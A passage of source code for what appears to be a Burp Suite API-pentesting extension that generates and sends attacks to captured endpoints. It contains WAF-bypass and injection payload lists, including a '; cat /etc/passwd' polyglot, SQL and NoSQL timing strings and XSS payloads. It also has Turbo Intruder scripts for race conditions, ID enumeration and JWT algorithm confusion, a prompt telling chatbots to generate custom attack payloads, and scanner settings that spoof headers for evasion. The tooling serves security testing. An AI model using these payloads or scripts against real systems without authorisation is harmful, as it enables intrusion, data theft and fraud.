            lines.append("  [*] Note: {}".format(attack["note"]))
        
        lines.append("")  # Blank line between attacks
        return lines

    def _generate_fuzzing_attacks(self, endpoints, attack_type):
        """Core fuzzing logic - pure function for testing"""
        attacks = []
        for key, entries in endpoints.items():
            try:
                entry = self._get_entry(entries)
                normalized = self._normalize_endpoint_data(entry)
                
                # Skip non-existent endpoints (404s)
                if normalized["response_status"] == 404:
                    continue
                
                # Skip frontend routes that aren't APIs
                path = normalized["path"].lower()
                if self._is_frontend_route(path, normalized["content_type"]):
                    continue
                
                checks = [
                    self._check_bola(normalized, attack_type),
                    self._check_idor(normalized, attack_type),
                    self._check_auth_bypass(normalized, attack_type),
                    self._check_sqli(normalized, attack_type),
                    self._check_xss(normalized, attack_type),
                    self._check_nosqli(normalized, attack_type),
                    self._check_path_traversal(normalized, attack_type),
                    self._check_mass_assignment(normalized, attack_type),
                    self._check_race_condition(normalized, attack_type),
                    self._check_graphql(normalized, attack_type),
                    self._check_jwt(normalized, attack_type),
                    self._check_ssti(normalized, attack_type),
                    self._check_deserialization(normalized, attack_type),
                    self._check_business_logic(normalized, attack_type),
                    self._check_waf_bypass(normalized, attack_type),
                ]
                for attack in checks:
                    if attack:
                        attacks.append((key, attack))
            except Exception as e:
                self._callbacks.printError(
                    "Error processing {}: {}".format(key, str(e))
                )
        return attacks

    def _check_race_condition(self, normalized, attack_type):
        if attack_type != "All":
            return None
        if normalized["method"] not in ["POST", "PUT", "PATCH", "DELETE"]:
            return None
        path = normalized["path"].lower()
        if not any(
            k in path for k in ["coupon", "redeem", "purchase", "transfer", "withdraw"]
        ):
            return None
        rc = self._get_race_condition_payloads()
        return {
            "type": "Race Condition",
            "techniques": rc["techniques"],
            "targets": rc["targets"],
            "test": "Send parallel requests to exploit TOCTOU",
            "risk": "Double spending, inventory bypass, rate limit bypass",
        }

    def _check_graphql(self, normalized, attack_type):
        if attack_type != "All":
            return None
        if "graphql" not in normalized["path"].lower():
            return None
        gql = self._get_graphql_attacks()
        return {
            "type": "GraphQL Abuse",
            "introspection": gql["introspection"][0],
            "attacks": [
                "Batching",
                "Depth limit bypass",
                "Alias abuse",
                "Mutation injection",
            ],
            "test": "Query batching, depth attacks, introspection",
            "risk": "DoS, data exfiltration, unauthorized mutations",
        }

    def _check_jwt(self, normalized, attack_type):
        if attack_type != "All":
            return None
        if "Bearer Token" not in normalized["auth"]:
            return None
        jwt = self._get_jwt_attacks()
        return {
            "type": "JWT Exploitation",
            "attacks": jwt["alg_confusion"] + jwt["kid_injection"][:2],
            "claims": jwt["claims"],
            "test": "Algorithm confusion, kid injection, claim manipulation",
            "risk": "Authentication bypass, privilege escalation",
        }

    def _check_ssti(self, normalized, attack_type):
        if attack_type != "All":
            return None
        params = normalized["params"]
        if not params["url"] and not params["body"]:
            return None
        return {
            "type": "SSTI",
            "payloads": self._get_ssti_payloads()[:6],
            "test": "Template injection in params",
            "risk": "Remote code execution",
        }

    def _check_deserialization(self, normalized, attack_type):
        if attack_type != "All":
            return None
        ct = normalized["content_type"].lower()
        if "java" not in ct and "serializ" not in ct and "application/octet" not in ct:
            return None
        return {
            "type": "Deserialization",
            "payloads": self._get_deserialization_payloads()[:3],
            "test": "Inject malicious serialized objects",
            "risk": "Remote code execution",
        }

    def _check_business_logic(self, normalized, attack_type):
        if attack_type != "All":
            return None
        path = normalized["path"].lower()
        if not any(
            k in path
            for k in ["price", "amount", "quantity", "payment", "checkout", "order"]
        ):
            return None
        bl = self._get_business_logic_tests()
        return {
            "type": "Business Logic",
            "price_tests": bl["price_manipulation"],
            "quantity_tests": bl["quantity_abuse"],
            "test": "Negative values, overflow, workflow bypass",
            "risk": "Financial loss, inventory manipulation",
        }

    def _is_frontend_route(self, path, content_type):
        """Detect if endpoint is a frontend route (not an API)"""
        # Frontend route indicators
        frontend_patterns = [
            "/auction/", "/post/", "/comment/", "/user/", "/profile/",
            "/article/", "/page/", "/view/", "/show/"
        ]
        
        # If it returns HTML and matches frontend patterns, it's likely a UI route
        if "html" in content_type.lower():
            if any(pattern in path for pattern in frontend_patterns):
                return True
        
        # If it has {id} but no /api/ prefix and returns HTML, likely frontend
        if "{id}" in path and "/api/" not in path and "html" in content_type.lower():
            return True
            
        return False
    
    def _check_waf_bypass(self, normalized, attack_type):
        """Check if endpoint should be tested for WAF bypass (pure function)"""
        if attack_type not in ["WAF Bypass", "All"]:
            return None

        return {
            "type": "WAF Bypass",
            "test": "Header injection, encoding bypass, method override, path pollution",
            "risk": "WAF evasion leading to exploitation of underlying vulnerabilities",
        }

    # Advanced WAF bypass techniques from waf_bypass_advanced.py
    def _get_sql_comment_obfuscation(self):
        """SQL comment-based obfuscation"""
        return ["UN/**/ION","SEL/**/ECT","OR/**/1=1","UN/*!50000ION*/","/*!50000SELECT*/","UN/**/I/**/ON","S/**/E/**/L/**/E/**/C/**/T","UNION#comment\nSELECT","OR#\n1=1","UNION-- \nSELECT"]

    def _get_polyglot_payloads(self):
        """Polyglot payloads (multi-context)"""
        return ["';alert(1)//","';alert(String.fromCharCode(88,83,83))//","' OR 1=1--<script>alert(1)</script>","; cat /etc/passwd' OR '1'='1","*)(uid=*))(|(uid=*' OR '1'='1"]

    def _get_whitespace_obfuscation(self):
        """Whitespace-based obfuscation"""
        return ["UNION\tSELECT","OR\t1=1","UNION\nSELECT","OR\n1=1","UNION\rSELECT","UNION  SELECT","OR   1=1","UNION\t\nSELECT","UNION\fSELECT"]

    def _get_charset_manipulation(self):
        """Character set manipulation"""
        return ["%c0%27","%c0%22","%u0027","%u003c","%u0022","%u003e","%c1%1c","%c1%9c"]

    def _get_http_parameter_pollution(self):
        """HTTP Parameter Pollution"""
        return ["id=1&id=2","id=1&id=' OR '1'='1","id[]=1&id[]=2","id[0]=1&id[1]=2","id=1&id[]=2","id={\"$ne\":null}","filter={\"$gt\":\"\"}"]

    def _get_unicode_normalization(self):
        """Unicode normalization bypasses"""
        return ["\uff1c\uff53\uff43\uff52\uff49\uff50\uff54\uff1e","s\u0300cript","\u0430lert","\u0441ript","s\u200bcript","al\u200dert"]

    def _get_json_smuggling(self):
        """JSON smuggling techniques"""
        return ['{"role":"user","role":"admin"}','{"\\u0072ole":"admin"}','{"role\\u0000":"user","role":"admin"}','{"role":["user","admin"]}']

    def _get_xml_entity_tricks(self):
        """XML entity manipulation"""
        return ['<!DOCTYPE foo [<!ENTITY x "&#x3c;">]><foo>&x;script></foo>','<![CDATA[<script>alert(1)</script>]]>','&#60;script&#62;alert(1)&#60;/script&#62;','&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;']

    def _get_protocol_smuggling(self):
        """HTTP Request Smuggling patterns"""
        return {"chunked":["Transfer-Encoding: chunked","Transfer-Encoding: chunked, identity"],"cl_tricks":["Content-Length: 0","Content-Length: 5\r\nContent-Length: 6"]}

    def _get_regex_dos(self):
        """ReDoS patterns"""
        return ["(a+)+b","(a*)*b","(a|a)*b","(a|ab)*c","(.*a){x}","([a-zA-Z]+)*"]

    def _get_timing_attacks(self):
        """Timing-based bypass"""
        return {"sql":["'; WAITFOR DELAY '0:0:5'--","'; SELECT SLEEP(5)--","' AND SLEEP(5)--"],"nosql":['{"$where":"sleep(5000)"}','{"$where":"return sleep(5000)"}']}

    # ============================================================================
    # UI INTEGRATION - NAVIGATION: Search "UI INTEGRATION" to jump here
    # ============================================================================

    def _generate_fuzzing(self, attack_type):
        """UI wrapper for fuzzing generation"""
        self.log_to_ui("[*] Generating {} attacks".format(attack_type))
        self.fuzzer_area.setText("[*] Generating {} attacks...\n".format(attack_type))

        if not self.api_data:
            msg = "[!] No endpoints captured. Import data or capture traffic first."
            self.fuzzer_area.setText(msg)
            self.log_to_ui("[!] No endpoints to fuzz")
            return

        # Filter to API endpoints only
        api_endpoints = {}
        for key, entries in self.api_data.items():
            entry = self._get_entry(entries)
            path = entry["normalized_path"].lower()

            # Skip static files
            if any(
                path.endswith(ext) for ext in [".js", ".css", ".html", ".json", ".xml"]
            ):
                continue

            # Skip static resource paths
            if any(
                x in path
                for x in ["/dist/", "/static/", "/css/", "/shreddit/", "/recaptcha/"]
            ):
                continue

            api_endpoints[key] = entries

        if not api_endpoints:
            self.fuzzer_area.setText(
                "[!] No API endpoints found (filtered out {} static files)\n".format(
                    len(self.api_data)
                )
            )
            return

        self.log_to_ui(
            "[*] Fuzzing {} API endpoints (filtered {} static)".format(
                len(api_endpoints), len(self.api_data) - len(api_endpoints)
            )
        )

        try:
            attacks = self._generate_fuzzing_attacks(api_endpoints, attack_type)
            self.fuzzing_attacks = attacks

            # Count by type and severity
            attack_types = {}
            critical_count = 0
            high_count = 0

            for _, attack in attacks:
                atype = attack["type"]
                attack_types[atype] = attack_types.get(atype, 0) + 1

                # Count severity
                if atype in ["IDOR/BOLA", "BOLA", "Auth Bypass", "SQL Injection"]:
                    critical_count += 1
                elif atype in ["XSS", "NoSQL Injection", "SSTI", "Deserialization"]:
                    high_count += 1

            # Build summary
            summary = []
            summary.append("="*80)
            summary.append("FUZZING CAMPAIGN: {}".format(attack_type))
            summary.append("="*80)
            summary.append("")
            summary.append(
                "[*] Filtered: {} API endpoints (excluded {} static files)".format(
                    len(api_endpoints), len(self.api_data) - len(api_endpoints)
                )
            )
            summary.append(
                "[*] Generated: {} attacks across {} endpoints".format(
                    len(attacks), len(set([k for k, a in attacks]))
                )
            )
            summary.append(
                "[*] Critical: {} | High: {} | Medium: {}".format(
                    critical_count,
                    high_count,
                    len(attacks) - critical_count - high_count,
                )
            )
            summary.append("")
            summary.append("[*] Attack Types:")
            for atype, count in sorted(
                attack_types.items(), key=lambda x: x[1], reverse=True
            ):
                summary.append("    {}: {}".format(atype, count))
            summary.append("")

            # Show top 20 attacks only (reduced from 30)
            lines = summary
            lines.append("="*80)
            lines.append("TOP PRIORITY ATTACKS (showing 20/{})".format(len(attacks)))
            lines.append("="*80)
            lines.append("")

            shown = 0
            for key, attack in attacks:
                if shown >= 20:
                    break
                lines.extend(self._generate_attack_lines(key, attack))
                shown += 1

            if len(attacks) > 20:
                lines.append("="*80)
                lines.append(
                    "[*] {} more attacks not shown. Use filters or export for full list.".format(
                        len(attacks) - 20
                    )
                )
                lines.append("="*80)

            # Single batched UI update
            result_text = "\n".join(lines)
            SwingUtilities.invokeLater(lambda: self.fuzzer_area.setText(result_text))
            self.log_to_ui(
                "[+] Generated {} attacks ({} critical, {} high)".format(
                    len(attacks), critical_count, high_count
                )
            )
        except Exception as e:
            msg = "[!] Error: {}\n\nCheck Activity Log for details".format(str(e))
            self.fuzzer_area.setText(msg)
            self.log_to_ui("[!] Error generating fuzzing: {}".format(str(e)))
            import traceback

            self._callbacks.printError(traceback.format_exc())

    def _send_fuzzing_to_intruder(self):
        """Send generated attacks to Burp Intruder with auto-configured positions"""
        if not self.api_data:
            msg = "[!] No endpoints captured. Import data or capture traffic first."
            self.fuzzer_area.setText(msg)
            self.log_to_ui("[!] No endpoints to send")
            return
        if not self.fuzzing_attacks:
            msg = "[!] Click 'Generate' first to create fuzzing attacks."
            self.fuzzer_area.setText(msg)
            self.log_to_ui("[!] Generate attacks first")
            return

        self.fuzzer_area.append("\n" + "=" * 80 + "\n")
        self.fuzzer_area.append("[*] Sending to Burp Intruder...\n")

        try:
            sent = 0
            for endpoint_key, attack in self.fuzzing_attacks[:10]:
                if endpoint_key not in self.api_data:
                    continue

                entries = self.api_data[endpoint_key]
                entry = self._get_entry(entries)

                # Build request with attack positions
                request = self._build_intruder_request(entry, attack)
                if not request:
                    continue

                use_https = entry["protocol"] == "https"
                port = (
                    entry["port"] if entry["port"] != -1 else (443 if use_https else 80)
                )

                self._callbacks.sendToIntruder(
                    entry["host"], port, use_https, self._helpers.stringToBytes(request)
                )
                sent += 1

            self.fuzzer_area.append("[+] Sent {} attacks to Intruder\n".format(sent))
            self.fuzzer_area.append(
                "[+] Check Burp Intruder tab for configured positions (§markers§)\n"
            )
            self.log_to_ui("[+] Sent {} to Intruder".format(sent))
            self.log_to_ui("[+] Check Intruder tab")
        except Exception as e:
            self.fuzzer_area.append("[!] Error: {}\n".format(str(e)))
            self.log_to_ui("[!] Error sending to Intruder: {}".format(str(e)))
            import traceback

            self._callbacks.printError(traceback.format_exc())

    def _build_intruder_request(self, entry, attack):
        """Build HTTP request with Intruder attack positions marked"""
        try:
            method = entry["method"]
            path = entry["path"]
            query = entry.get("query_string", "")
            headers = entry.get("headers", {})
            body = entry.get("request_body", "")

            # Mark attack positions based on attack type
            if attack["type"] in ["IDOR/BOLA", "BOLA"]:
                # Mark IDs in path
                path = path.replace("/1", "/§1§").replace("/2", "/§2§")
                import re

                path = re.sub(r"/(\d+)", r"/§\1§", path)

            if attack["type"] == "WAF Bypass":
                # Add WAF bypass headers
                if "bypass_headers" in attack:
                    for bypass_header in attack["bypass_headers"][:3]:
                        headers[bypass_header.split(":")[0]] = bypass_header.split(":", 1)[1].strip()

            if attack["type"] in ["SQL Injection", "XSS", "SSTI"]:
                # Mark parameters
                if "params" in attack and attack["params"]:
                    for param in attack["params"]:
                        query = query.replace("{}=".format(param), "{}=§".format(param))
                        query = query.replace("&", "§&")
                elif "reflected" in attack:
                    for param in attack["reflected"]:
                        query = query.replace("{}=".format(param), "{}=§".format(param))
                        query = query.replace("&", "§&")

            # Build request
            full_path = path
            if query:
                full_path += "?" + query

            lines = ["{} {} HTTP/1.1".format(method, full_path)]
            lines.append("Host: {}".format(entry["host"]))

            for k, v in headers.items():
                if k.lower() not in ["host", "content-length"]:
                    # Mark auth headers for BOLA/Auth Bypass
                    if (
                        attack["type"] in ["BOLA", "Auth Bypass"]
                        and k.lower() == "authorization"
                    ):
                        lines.append("{}: §{}§".format(k, v))
                    else:
                        lines.append("{}: {}".format(k, v))

            if body:
                lines.append("Content-Length: {}".format(len(body)))
                lines.append("")
                # Mark body params for injection attacks
                if attack["type"] in [
                    "SQL Injection",
                    "NoSQL Injection",
                    "Mass Assignment",
                ]:
                    body = (
                        body.replace('":', '":§').replace(",", "§,").replace("}", "§}")
                    )
                lines.append(body)
            else:
                lines.append("")
                lines.append("")

            return "\r\n".join(lines)
        except Exception as e:
            self._callbacks.printError("Error building request: {}".format(str(e)))
            return None

    def _load_success_patterns(self):
        """Load success detection patterns from JSON"""
        import os
        try:
            pattern_file = os.path.join(os.path.dirname(__file__), "success_patterns.json")
            if os.path.exists(pattern_file):
                with open(pattern_file, 'r') as f:
                    return json.load(f)
        except Exception as e:
            self._callbacks.printError("Failed to load success patterns: {}".format(str(e)))
        return {}

    def _detect_vulnerability(self, response_body, response_status, attack_type):
        """Detect if attack was successful based on response"""
        patterns = getattr(self, 'success_patterns', None)
        if not patterns:
            self.success_patterns = self._load_success_patterns()
            patterns = self.success_patterns

        if attack_type == "SQLI" and "sqli" in patterns:
            for pattern_obj in patterns["sqli"].get("error_based", []):
                if re.search(pattern_obj["pattern"], response_body, re.I):
                    return {"vulnerable": True, "confidence": pattern_obj["confidence"],
                            "evidence": "SQL error: {}".format(pattern_obj.get("db", "detected"))}

        elif attack_type == "XSS" and "xss" in patterns:
            for pattern_obj in patterns["xss"].get("reflection", []):
                if re.search(pattern_obj["pattern"], response_body, re.I):
                    return {"vulnerable": True, "confidence": pattern_obj["confidence"],
                            "evidence": "XSS payload reflected"}

        elif attack_type == "NoSQL Injection" and "nosqli" in patterns:
            for pattern_obj in patterns["nosqli"].get("error", []):
                if re.search(pattern_obj["pattern"], response_body, re.I):
                    return {"vulnerable": True, "confidence": pattern_obj["confidence"],
                            "evidence": "NoSQL error detected"}

        return {"vulnerable": False}

    def _select_payloads_for_param(self, param_name, param_value):
        """Context-aware payload selection based on parameter name/value"""
        payloads = []
        param_lower = param_name.lower()

        if re.search(r'email|mail', param_lower):
            payloads.extend(["<script>alert(1)</script>", "' OR '1'='1", "test@test.com'"])[:5]
        elif re.search(r'id|user_id|account', param_lower):
            if param_value and param_value.isdigit():
                payloads.extend(["1", "2", "999", "-1", "0"])[:5]
            elif param_value and len(param_value) == 36:
                payloads.extend(["00000000-0000-0000-0000-000000000000"])[:3]
        elif re.search(r'price|amount|cost|total', param_lower):
            payloads.extend(["-1", "0", "0.01", "999999999"])[:5]
        elif re.search(r'name|user|comment', param_lower):
            payloads.extend(["<script>alert(1)</script>", "{{7*7}}", "' OR '1'='1"])[:5]
        else:
            payloads.extend(["'", "<script>alert(1)</script>", "1' OR '1'='1"])[:3]

        return payloads

    def _generate_curl_command(self, entry, payload=None):
        """Generate cURL command for manual testing"""
        method = entry.get("method", "GET")
        protocol = entry.get("protocol", "https")
        host = entry.get("host", "")
        port = entry.get("port", -1)
        path = entry.get("path", "/")
        headers = entry.get("headers", {})
        body = entry.get("request_body", "")

        if port == -1:
            port = 443 if protocol == "https" else 80

        if (protocol == "https" and port == 443) or (protocol == "http" and port == 80):
            url = "{}://{}{}".format(protocol, host, path)
        else:
            url = "{}://{}:{}{}".format(protocol, host, port, path)

        curl = "curl -X {} '{}' \\".format(method, url)

        for header, value in headers.items():
            if header.lower() not in ["host", "content-length"]:
                curl += "\n  -H '{}: {}' \\".format(header, value)

        if payload:
            curl += "\n  -d '{}' \\".format(payload)
        elif body and method in ["POST", "PUT", "PATCH"]:
            curl += "\n  -d '{}' \\".format(body[:200])

        curl += "\n  -i -k -L"
        return curl

    def _copy_attack_as_curl(self):
        """Copy first attack as cURL command"""
        if not self.fuzzing_attacks:
            self.fuzzer_area.append("\n[!] Generate attacks first\n")
            return

        endpoint_key, attack = self.fuzzing_attacks[0]
        if endpoint_key not in self.api_data:
            self.fuzzer_area.append("\n[!] Endpoint not found\n")
            return

        entry = self._get_entry(self.api_data[endpoint_key])

        payload = None
        if "payloads" in attack and attack["payloads"]:
            payload = str(attack["payloads"][0])

        curl_cmd = self._generate_curl_command(entry, payload)

        self._copy_to_clipboard(curl_cmd)
        self.fuzzer_area.append("\n[+] Copied cURL command for: {}\n".format(endpoint_key))
        self.fuzzer_area.append("[+] Attack type: {}\n".format(attack["type"]))
        if payload:
            self.fuzzer_area.append("[+] Payload: {}\n".format(payload[:100]))
        self.log_to_ui("[+] Copied cURL command to clipboard")

    def _export_payloads(self):
        """Export payloads to file"""
        try:
            import os

            self.log_to_ui("[*] Export Payloads button clicked")
            self.log_to_ui("[*] api_data: {} endpoints".format(len(self.api_data)))
        except Exception as e:
            self.log_to_ui("[!] Error in export init: {}".format(str(e)))
            return

        if not self.api_data:
            msg = "[!] No endpoints captured. Import data or capture traffic first."
            self.fuzzer_area.append("\n" + msg + "\n")
            self.log_to_ui("[!] No endpoints available")
            return

        self.fuzzer_area.append("\n" + "=" * 80 + "\n")
        self.fuzzer_area.append("[*] Exporting payloads...\n")
        export_dir = self._get_export_dir("Payloads")
        if not export_dir:
            return
        filename = os.path.join(export_dir, "payloads.json")
        payloads = {
            "idor": self._get_idor_payloads(),
            "sqli": self._get_sqli_payloads(),
            "xss": self._get_xss_payloads(),
            "nosqli": self._get_nosqli_payloads(),
            "ssrf": self._get_ssrf_payloads(),
            "xxe": self._get_xxe_payloads(),
            "ssti": self._get_ssti_payloads(),
            "deserialization": self._get_deserialization_payloads(),
            "waf_bypass": {
                "headers": self._get_waf_bypass_headers(),
                "encoding": self._get_waf_bypass_encoding(),
                "http_methods": self._get_waf_bypass_http_methods(),
                "path_tricks": self._get_waf_bypass_path_tricks(),
                "content_types": self._get_waf_bypass_content_type(),
            },
        }
        writer = None
        try:
            writer = FileWriter(filename)
            writer.write(json.dumps(payloads, indent=2))
            self.fuzzer_area.append("[+] Exported payloads\n")
            self.fuzzer_area.append(
                "[+] Categories: idor, sqli, xss, nosqli, ssrf, xxe, ssti, deserialization, waf_bypass\n"
            )
            self.fuzzer_area.append("[+] Folder: {}\n".format(export_dir))
            self.fuzzer_area.append("[+] File: {}\n".format(filename))
            self.log_to_ui("[+] Exported payloads to: {}".format(export_dir))
        except Exception as e:
            self.fuzzer_area.append("[!] Export failed: {}\n".format(str(e)))
            self.log_to_ui("[!] Payload export failed: {}".format(str(e)))
            import traceback

            self._callbacks.printError(traceback.format_exc())
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as e:
                    self._callbacks.printError(
                        "Error closing payloads file: {}".format(str(e))
                    )

    def _export_ai_context(self):
        """Export context for AI-powered payload generation"""
        import os

        if not self.api_data or not self.fuzzing_attacks:
            msg = "[!] Generate fuzzing attacks first"
            self.fuzzer_area.append("\n" + msg + "\n")
            self.log_to_ui(msg)
            return

        self.fuzzer_area.append("\n" + "=" * 80 + "\n")
        self.fuzzer_area.append("[*] Exporting AI context...\n")

        export_dir = self._get_export_dir("AI_Context")
        if not export_dir:
            return

        ai_context = {
            "task": "Generate custom payloads for API security testing",
            "endpoints": [],
            "prompt": self._generate_ai_prompt(),
        }

        for endpoint_key, attack in self.fuzzing_attacks[:20]:
            entry = self._get_entry(self.api_data[endpoint_key])
            ai_context["endpoints"].append(
                {
                    "endpoint": endpoint_key,
                    "method": entry["method"],
                    "path": entry["normalized_path"],
                    "attack_type": attack["type"],
                    "params": entry.get("parameters", {}),
                    "auth": entry.get("auth_detected", []),
                    "sample_request": self._format_sample(entry),
                }
            )

        filename = os.path.join(export_dir, "ai_context.json")
        try:
            writer = FileWriter(filename)
            writer.write(json.dumps(ai_context, indent=2))
            writer.close()
            self.fuzzer_area.append("[+] Exported AI context\n")
            self.fuzzer_area.append(
                "[+] Feed this JSON to ChatGPT/Claude for custom payloads\n"
            )
            self.fuzzer_area.append("[+] Folder: {}\n".format(export_dir))
            self.fuzzer_area.append("[+] File: {}\n".format(filename))
            self.log_to_ui("[+] Exported AI context to: {}".format(export_dir))
        except Exception as e:
            self.fuzzer_area.append("[!] Export failed: {}\n".format(str(e)))
            self.log_to_ui("[!] AI context export failed: {}".format(str(e)))

    def _generate_ai_prompt(self):
        return """# AI Payload Generation Task

Analyze the provided API endpoints and generate custom, context-aware payloads for:

1. **IDOR/BOLA**: Generate IDs based on observed patterns (sequential, UUID, hash)
2. **SQLi**: Craft payloads specific to detected database type and query structure
3. **XSS**: Generate context-aware payloads based on reflection points
4. **Auth Bypass**: Create token manipulation payloads based on auth method
5. **Business Logic**: Generate edge cases for price/quantity fields

## Requirements:
- Analyze parameter names and types
- Consider authentication mechanisms
- Generate 20-50 payloads per vulnerability type
- Include bypass techniques for WAF/filters
- Provide success detection patterns

## Output Format:
```json
{
  "endpoint": "GET:/api/users/{id}",
  "payloads": [
    {"value": "1", "description": "Sequential ID", "expected": "200 OK"},
    {"value": "../admin", "description": "Path traversal", "expected": "403 or data leak"}
  ]
}
```
"""

    def _export_turbo_intruder(self):
        """Export Turbo Intruder Python scripts for race conditions and high-speed attacks"""
        import os

        if not self.api_data or not self.fuzzing_attacks:
            msg = "[!] Generate fuzzing attacks first"
            self.fuzzer_area.append("\n" + msg + "\n")
            self.log_to_ui(msg)
            return

        self.fuzzer_area.append("\n" + "=" * 80 + "\n")
        self.fuzzer_area.append("[*] Exporting Turbo Intruder scripts...\n")

        export_dir = self._get_export_dir("TurboIntruder")
        if not export_dir:
            return

        # Generate scripts for different attack types
        scripts = {
            "race_condition.py": self._generate_race_script(),
            "bola_enum.py": self._generate_bola_script(),
            "jwt_brute.py": self._generate_jwt_script(),
        }

        for script_name, script_content in scripts.items():
            filename = os.path.join(export_dir, script_name)
            try:
                writer = FileWriter(filename)
                writer.write(script_content)
                writer.close()
                self.fuzzer_area.append("[+] Created: {}\n".format(script_name))
            except Exception as e:
                self.fuzzer_area.append(
                    "[!] Failed: {} - {}\n".format(script_name, str(e))
                )
                self.log_to_ui("[!] Failed to write {}: {}".format(script_name, str(e)))

        self.fuzzer_area.append("[+] Exported Turbo Intruder scripts\n")
        self.fuzzer_area.append("[+] Folder: {}\n".format(export_dir))
        self.log_to_ui("[+] Exported Turbo Intruder scripts to: {}".format(export_dir))

    def _generate_race_script(self):
        return """# Turbo Intruder - Race Condition Attack
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=1,
                          pipeline=False)

    # Warm up connection pool
    for i in range(10):
        engine.queue(target.req)

    # Send parallel requests
    for i in range(100):
        engine.queue(target.req, gate='race1')

    # Open gate for simultaneous execution
    engine.openGate('race1')

def handleResponse(req, interesting):
    if req.status == 200:
        table.add(req)
"""

    def _generate_bola_script(self):
        return """# Turbo Intruder - BOLA Enumeration
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=10,
                          requestsPerConnection=100,
                          pipeline=False)

    # Enumerate IDs
    for i in range(1, 10000):
        engine.queue(target.req, str(i))

    # Try common usernames
    for word in open('/usr/share/wordlists/usernames.txt'):
        engine.queue(target.req, word.strip())

def handleResponse(req, interesting):
    if req.status == 200 and len(req.response) > 100:
        table.add(req)
"""

    def _generate_jwt_script(self):
        return """# Turbo Intruder - JWT Algorithm Confusion
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=5,
                          requestsPerConnection=50,
                          pipeline=False)

    # Algorithm confusion attacks
    algs = ['none', 'None', 'NONE', 'nOnE', 'HS256', 'HS384', 'HS512']
    for alg in algs:
        modified_req = target.req.replace('alg":"RS256', 'alg":"' + alg)
        engine.queue(modified_req)

    # Null signature
    engine.queue(target.req.replace(target.req.split('.')[-1], ''))

def handleResponse(req, interesting):
    if req.status == 200:
        table.add(req)
"""

    def _export_nuclei_targets(self):
        """Export Nuclei scan results - only if scan has been run"""
        current_text = self.nuclei_area.getText()
        if not current_text or "NUCLEI SCAN RESULTS" not in current_text:
            self.nuclei_area.setText("[!] No discoveries to export\n[!] Run Nuclei scan first\n")
            return
        self.nuclei_area.append("\n[!] Results displayed above\n")

    def _run_nuclei(self):
        """Run Nuclei scanner on endpoints from Recon tab"""
        import os
        import subprocess

        nuclei_path = self.nuclei_path_field.getText().strip()
        if not nuclei_path:
            self.nuclei_area.setText("[!] Configure Nuclei path first\n")
            return
        if not self.api_data:
            self.nuclei_area.setText(
                "[!] No endpoints in Recon tab. Capture or import first\n"
            )
            return

        # Create temp file in /tmp instead of auto-saving to user directory
        import tempfile

        temp_dir = tempfile.mkdtemp(prefix="burp_nuclei_")
        targets_file = os.path.join(temp_dir, "targets.txt")
        output_file = os.path.join(temp_dir, "results.txt")
        json_file = os.path.join(temp_dir, "results.json")

        # Write base URLs + discovery paths for NEW endpoint discovery
        writer = None
        try:
            writer = FileWriter(targets_file)
            with self.lock:
                data_snapshot = list(self.api_data.items())

            # Extract unique base URLs and API paths
            base_urls = set()
            api_paths = set()
            for _, entries in data_snapshot:
                entry = self._get_entry(entries)
                protocol = entry.get("protocol", "https")
                host = entry.get("host", "")
                port = entry.get("port", -1)
                if port == -1:
                    port = 443 if protocol == "https" else 80

                # Base URL
                if (protocol == "https" and port == 443) or (protocol == "http" and port == 80):
                    base = "{}://{}".format(protocol, host)
                else:
                    base = "{}://{}:{}".format(protocol, host, port)
                base_urls.add(base)

                # Extract API base paths
                path = entry.get("normalized_path", "/")
                parts = path.strip("/").split("/")
                if len(parts) > 0 and parts[0]:
                    api_paths.add("/" + parts[0])

            target_count = 0
            # Write base URLs for root discovery
            for base in sorted(base_urls):
                writer.write(base + "\n")
                target_count += 1

            # Write API base paths for deeper discovery
            for base in sorted(base_urls):
                for api_path in sorted(api_paths):
                    writer.write(base + api_path + "\n")
                    target_count += 1
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as e:
                    self._callbacks.printError(
                        "Error closing nuclei scan targets file: {}".format(str(e))
                    )

        self.log_to_ui("[*] Nuclei discovery: {} base URLs + API paths".format(target_count))
        self.log_to_ui("[*] Targets: {}".format(targets_file))
        self.log_to_ui("[*] Output: {}".format(output_file))
        self.nuclei_area.setText("[*] Initializing Nuclei (WAF EVASION MODE)...\n")
        self.nuclei_area.append("[*] Discovery targets: {} (base URLs + API paths)\n".format(target_count))
        self.nuclei_area.append(
            "[*] Tags: exposure,config,api,swagger,graphql,jwt,auth,keys,debug,logs (max coverage)\n"
        )
        self.nuclei_area.append(
            "[*] Excluding: dos,intrusive,headless only\n"
        )
        self.nuclei_area.append("[*] Timeout: 5s, Retries: 1 (speed optimized)\n")
        self.nuclei_area.append("[*] Rate: 150 req/s, Concurrency: 25 (fast mode)\n")
        self.nuclei_area.append("[*] Evasion: Random UA + X-Forwarded-For spoofing\n\n")

        def run_scan():
            try:
                # Discovery-focused: find NEW endpoints
                include_tags = "exposure,config,api,swagger,openapi,graphql,jwt,panel,debug,backup,logs,trace,files,paths"
                exclude_tags = "dos,intrusive,headless,cve,fuzz"

                cmd = [
                    nuclei_path,
                    "-list",
                    targets_file,
                    "-o",
                    output_file,
                    "-jsonl",
                    json_file,
                    "-tags",
                    include_tags,
                    "-etags",
                    exclude_tags,
                    "-no-color",
                    "-timeout",
                    "5",
                    "-retries",
                    "1",
                    "-rate-limit",
                    "150",
                    "-c",
                    "25",
                    "-silent",
                    "-disable-update-check",
                    "-random-agent",
                    "-header",
                    "X-Forwarded-For: 127.0.0.1",
                ]
                SwingUtilities.invokeLater(
                    lambda: self.nuclei_area.append(
                        "[*] Command: {}\n\n".format(" ".join(cmd))
                    )
                )
                SwingUtilities.invokeLater(
                    lambda: self.log_to_ui("[*] Nuclei cmd: {}".format(" ".join(cmd)))
                )
                SwingUtilities.invokeLater(
                    lambda: self.nuclei_area.append("[*] Discovery mode: Scanning base URLs to find NEW endpoints\n\n")
                )

                import time as time_module

                start_time = time_module.time()
                try:
                    process = subprocess.Popen(  # nosec B603
                        cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False
                    )
                except Exception as e:
                    SwingUtilities.invokeLater(
                        lambda: self.nuclei_area.append(
                            "[!] Failed to start nuclei: {}\n".format(str(e))
                        )
                    )
